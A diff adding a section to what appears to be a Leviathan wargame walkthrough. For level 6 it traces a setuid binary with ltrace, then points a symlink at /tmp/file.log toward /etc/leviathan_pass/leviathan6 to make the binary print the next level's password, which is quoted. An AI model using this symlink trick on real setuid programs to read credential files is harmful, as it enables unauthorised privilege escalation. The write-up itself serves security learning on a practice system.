@@ -371,7 +371,37 @@ Password: 0dyxT7F4QD
 ---
 
 #### Level 6
+You will find another setuid binary file `leviathan5` in the root directory.
 
+Running it gives you a message, "Cannot find /tmp/file.log".
+
+The next logical step would be to create a file called `file.log` in the `/tmp` directory and run the binary file again to see what it happens.
+
+```bash
+leviathan5@gibson:~$ touch /tmp/file.log
+leviathan5@gibson:~$ ltrace ./leviathan5
+__libc_start_main(0x804910d, 1, 0xffffd484, 0 <unfinished ...>
+fopen("/tmp/file.log", "r")                                   = 0x804d1a0
+fgetc(0x804d1a0)                                              = '\377'
+feof(0x804d1a0)                                               = 1
+fclose(0x804d1a0)                                             = 0
+getuid()                                                      = 12005
+setuid(12005)                                                 = 0
+unlink("/tmp/file.log")                                       = 0
++++ exited (status 0) +++
+```
+
+You can see that this time it yields a different output since the `/tmp/file.log` is present. The first four commands are part of C; `fopen("/tmp/file.log", "r")` opens the file in read mode, the `fgetc` command gets the contents of a file one character at a time and returns the ASCII code for the characters read, the `feof` command checks for the end of a file, and `fclose` closes the file. Afterwards, `getuid()` gets the real user ID (leviathan5) and `setuid` sets the effective user ID as leviathan5 (originally leviathan6). The last command `unlink` can be used like the `rm` command to delete files and directories but the difference is that it can also be used to remove symbolic links from files.
+
+With this in mind, because the initial few commands are run with the effective user ID of leviathan6, you could create a symbolic link to the file `/etc/leviathan_pass/leviathan6`; that way when the binary file is executed, it would read and return the contents of the password.
+
+```bash
+leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@gibson:~$ ./leviathan5
+szo7HDB88w
+```
+
+Password: szo7HDB88w
 
 ---
 
